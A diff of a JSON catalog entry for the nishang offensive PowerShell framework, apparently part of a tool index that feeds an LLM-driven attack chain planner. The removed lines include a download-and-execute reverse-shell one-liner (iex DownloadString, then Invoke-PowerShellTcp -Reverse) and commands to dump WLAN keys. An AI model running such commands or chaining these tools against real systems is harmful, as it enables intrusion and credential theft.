@@ -126,6 +126,11 @@
         "name": "--capture",
         "description": "Capture mode: write packets to a pcap file.",
         "source": "v2_enhancement"
+      },
+      {
+        "name": "--filter",
+        "description": "BPF filter expression for packet selection.",
+        "source": "v2_enhancement"
       }
     ],
     "examples": [
@@ -280,27 +285,26 @@
     "kfiosa",
     "indexed",
     "polymorphic",
-    "target-adaptive"
+    "target-adaptive",
+    "catalog",
+    "github"
   ],
   "use_cases": [
-    "When you need Offensive PowerShell framework, use nishang because Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nis.",
-    "When you need a concrete invocation, run `PS C:\\nishang> Import-Module .\\nishang.psm1` as documented upstream for nishang.",
-    "When you need a concrete invocation, run `PS C:\\nishang> . C:\\nishang\\Gather\\Get-Information.ps1` as documented upstream for nishang.",
-    "When you need a concrete invocation, run `PS C:\\nishang> Get-Information` as documented upstream for nishang.",
-    "When you need a concrete invocation, run `PS C:\\nishang> Get-Help [scriptname] -full` as documented upstream for nishang.",
-    "When chaining Offensive PowerShell framework tools, pair nishang with sibling catalog entries sharing its attack_surface/phase_hint.",
-    "When validating lab setup, run `nishang --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
   ],
   "command_examples": [
-    "PS C:\\nishang> Import-Module .\\nishang.psm1",
-    "PS C:\\nishang> . C:\\nishang\\Gather\\Get-Information.ps1",
-    "PS C:\\nishang> Get-Information",
-    "PS C:\\nishang> Get-Help [scriptname] -full",
-    "PS C:\\nishang> . C:\\nishang\\Get-WLAN-Keys.ps1",
-    "PS C:\\nishang> Get-Help Get-WLAN-Keys -Full",
-    "powershell iex (New-Object Net.WebClient).DownloadString('$KFIOSA_TARGET_URL');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]",
-    "PS C:\\nishang> . \\nishang\\Utility\\Invoke-Encode",
-    "PS C:\\nishang> Invoke-Encode -DataToEncode C:\\nishang\\Shells\\Invoke-PowerShellTcp.ps1 -OutCommand"
+    "cd toolboxes/nishang && python3 nishang.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/nishang && python3 nishang.py --help",
+    "cd toolboxes/nishang && python3 nishang.py --help",
+    "cd toolboxes/nishang && python3 nishang.py --help",
+    "cd toolboxes/nishang && python3 nishang.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST nishang --output $KFIOSA_OUTPUT_DIR/nishang.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST nishang --output $KFIOSA_OUTPUT_DIR/nishang.log"
   ],
   "_kfiosa_enriched_schema": "1.2.0",
   "_kfiosa_enriched_at": "phase4_t16",
